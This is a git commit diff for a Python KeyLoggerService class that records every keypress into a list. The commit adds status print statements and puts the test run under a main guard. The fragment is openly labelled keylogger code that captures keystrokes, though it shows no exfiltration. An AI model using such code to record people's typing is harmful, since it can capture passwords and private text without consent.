c43a390341cb0c5d35d530a8368c00d98b5185e5
Netanel Fadida <fnati02@gmail.com>
2025-02-23 15:28:20 +0200

    [KeyLoggerService]: Add some print's

--- KeyLoggerService/KeyLoggerService.py
+++ KeyLoggerService/KeyLoggerService.py
@@ -10,12 +10,12 @@ class KeyLoggerService(IKeyLogger):
     #The listener start to listen to every press keyboard
     def start_logging(self):
         self.listener.start()
+        print("\nStart logging...")
 
     #Add to data the press keyboard
     def __on_press(self, key):
         key_str = self.__format_key(key)
         self.data.append(key_str)
-        print(key_str)
 
     #Format every key to str
     def __format_key(self, key):
@@ -33,10 +33,19 @@ class KeyLoggerService(IKeyLogger):
     #Stop listener
     def stop_logging(self):
         self.listener.stop()
+        print("\nStop logging...")
 
-logger = KeyLoggerService()
-logger.start_logging()
-time.sleep(20)
+#Only for Testing
+if __name__ == '__main__':
+    logger = KeyLoggerService()
+    logger.start_logging()
+    time.sleep(5)
+    print(logger.get_logged_keys())
+    time.sleep(5)
+    logger.stop_logging()
+    print(logger.get_logged_keys())
+    time.sleep(5)
+    print(logger.get_logged_keys())
 
 
     
